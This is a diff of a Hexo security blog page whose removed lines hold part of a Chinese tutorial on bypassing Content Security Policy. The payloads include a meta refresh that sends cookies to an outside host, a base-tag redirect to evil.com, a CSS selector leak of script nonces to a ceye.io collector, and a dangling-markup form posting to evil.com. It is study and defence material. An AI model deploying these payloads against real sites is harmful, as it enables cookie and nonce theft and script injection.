-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://lorexxar.cn&quot;</span>&gt;</span> (H5预加载)(only chrome)</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://lorexxar.cn&quot;</span>&gt;</span> （DNS预加载）</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5;http://lorexxar.cn?c=[cookie]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="利用可信域的资源绕过"><a href="#利用可信域的资源绕过" class="headerlink" title="利用可信域的资源绕过"></a>利用可信域的资源绕过</h3><p>很多网站都会将google,baidu……添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp</p>
-<p>常用可控jsonp: <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
-<h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="利用-lt-base-gt-标签"><a href="#利用-lt-base-gt-标签" class="headerlink" title="利用&lt;base&gt;标签"></a>利用<code>&lt;base&gt;</code>标签</h4><p>Specify a default URL and a default target for all links on a page:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://www.evil.com/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/stickman.gif&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;39&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Stickman&quot;</span>&gt;</span><span class="comment">&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tags/tag_base.asp&quot;</span>&gt;</span>HTML base Tag<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="comment">&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>因此我们可以设置个<code>&lt;base&gt;</code>标签，将相对路径导向恶意的网站</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://evil.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><a target="_blank" rel="noopener" href="https://evil.com/foo/bar.js">https://evil.com/foo/bar.js</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(0000);</span><br></pre></td></tr></table></figure>
-
-<p>成功执行</p>
-<p>防御方式：</p>
-<p>在csp中添加：base-uri ‘none’ 或 base-uri ‘self’</p>
-<h4 id="利用chrome-bug-来修改script-src的值"><a href="#利用chrome-bug-来修改script-src的值" class="headerlink" title="利用chrome bug 来修改script src的值"></a>利用chrome bug 来修改script src的值</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">set</span> <span class="attr">href</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">attributeName</span>=<span class="string">&quot;href&quot;</span> <span class="attr">to</span>=<span class="string">&quot;data:,alert(1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">src</span>=<span class="string">&quot;foo.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>SVG中的set标签可以修改其他标签的属性值</p>
-<p>该漏洞在chrome58中修复</p>
-<h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">script &#123; <span class="attribute">display</span>: block &#125;</span></span><br><span class="line"><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;a&quot;</span>]</span>:after &#123; content: <span class="built_in">url</span>(<span class="string">&quot;record?a&quot;</span>) &#125;</span></span><br><span class="line"><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;b&quot;</span>]</span>:after &#123; content: <span class="built_in">url</span>(<span class="string">&quot;record?b&quot;</span>) &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以联合其他标签来发出请求，如<code>&lt;a&gt;</code> …</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;0&quot;</span>]</span>~<span class="selector-tag">a</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://y5pwcd.ceye.io/success&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>相关的css 语法</p>
-<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p>
-<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p>
-<h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>破坏原有的结构，将script标签变成文本，诱使用户点击</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//evil.com/form&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;nonce&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>利用低版本JQuery等js框架漏洞来绕过csp</p>
-<h2 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h2><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>检查csp: <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a> </p>
-<p>常用可控jsonp: <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
-<p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa">csp mitigator</a> :一个csp调试工具</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPs… You won’t guess what happened next!](<a target="_blank" rel="noopener" href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPs… You won’t guess what happened next!.pdf) </p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/423/">前端防御从入门到弃坑–CSP变迁</a></p>
-<h2 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h2><p>Bypassing CSP script nonces via the browser cache： <a target="_blank" rel="noopener" href="http://sebastian-lekies.de/csp/attacker.php">http://sebastian-lekies.de/csp/attacker.php</a></p>
-<p> <a target="_blank" rel="noopener" href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p>
-<p> <a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p>
-<p> <a target="_blank" rel="noopener" href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p>
-<p> <a target="_blank" rel="noopener" href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/19/bypass_csp/" data-id="cku8k8fxj003ad0ob9kq3h67c" data-title="bypass_csp" class="article-share-link">Share</a>
-      
-      
-      
     </footer>
   </div>
   
@@ -1331,7 +1290,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -1340,7 +1299,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
     </div>
   </div>
 
@@ -1351,6 +1310,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
+          </li>
         
           <li>
             <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
@@ -1366,10 +1329,6 @@
         
           <li>
             <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
           </li>
         
       </ul>
